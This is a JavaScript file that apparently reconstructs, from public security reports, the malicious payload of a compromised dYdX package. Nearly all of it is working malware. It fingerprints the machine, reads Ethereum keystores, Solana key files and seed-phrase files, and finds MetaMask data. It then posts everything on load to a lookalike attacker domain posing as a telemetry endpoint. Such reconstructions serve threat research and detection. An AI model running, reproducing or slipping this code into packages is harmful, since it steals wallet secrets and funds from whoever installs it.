// dydx-v4-client — reconstructed from public security analyses
// Source: https://socket.dev/blog/malicious-dydx-packages-published-to-npm-and-pypi
//
// February 2026: Account compromise of dYdX protocol npm/PyPI packages.
// Cryptocurrency wallet seed phrase stealer with device fingerprinting.
//
// Technique: Wallet file theft + seed phrase search + device fingerprint + exfil

const https = require("https");
const fs = require("fs");
const path = require("path");
const os = require("os");
const crypto = require("crypto");

// Device fingerprinting
function getFingerprint() {
  return {
    id: crypto.createHash("md5").update(os.hostname() + os.userInfo().username).digest("hex"),
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    mem: Math.round(os.totalmem() / 1024 / 1024 / 1024) + "GB",
    user: os.userInfo().username
  };
}

// Search for cryptocurrency wallet files and seed phrases
function harvestWallets() {
  var home = os.homedir();
  var findings = [];

  // Ethereum wallets
  var ethKeystore = path.join(home, ".ethereum", "keystore");
  try {
    if (fs.existsSync(ethKeystore)) {
      var files = fs.readdirSync(ethKeystore);
      files.forEach(function(f) {
        findings.push({
          type: "eth_keystore",
          name: f,
          data: fs.readFileSync(path.join(ethKeystore, f), "utf8")
        });
      });
    }
  } catch(e) {}

  // Solana wallet
  var solanaKey = path.join(home, ".config", "solana", "id.json");
  try {
    if (fs.existsSync(solanaKey)) {
      findings.push({
        type: "solana_key",
        data: fs.readFileSync(solanaKey, "utf8")
      });
    }
  } catch(e) {}

  // MetaMask (browser extension data)
  var metamaskPaths = [
    path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    path.join(home, ".config", "google-chrome", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
  ];

  metamaskPaths.forEach(function(mp) {
    try {
      if (fs.existsSync(mp)) {
        findings.push({ type: "metamask_dir", path: mp });
      }
    } catch(e) {}
  });

  // Search for seed phrase files
  var seedFiles = [".seed", "seed.txt", "mnemonic.txt", "wallet.txt"];
  seedFiles.forEach(function(sf) {
    var fp = path.join(home, sf);
    try {
      if (fs.existsSync(fp)) {
        findings.push({
          type: "seed_file",
          name: sf,
          data: fs.readFileSync(fp, "utf8")
        });
      }
    } catch(e) {}
  });

  return findings;
}

// Exfiltrate
function send(data) {
  var payload = JSON.stringify({
    fingerprint: getFingerprint(),
    wallets: data,
    ts: Date.now()
  });

  var req = https.request({
    hostname: "api.dydxprotocol-v4.com",  // attacker domain mimicking dydx
    port: 443,
    path: "/v4/telemetry",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

send(harvestWallets());
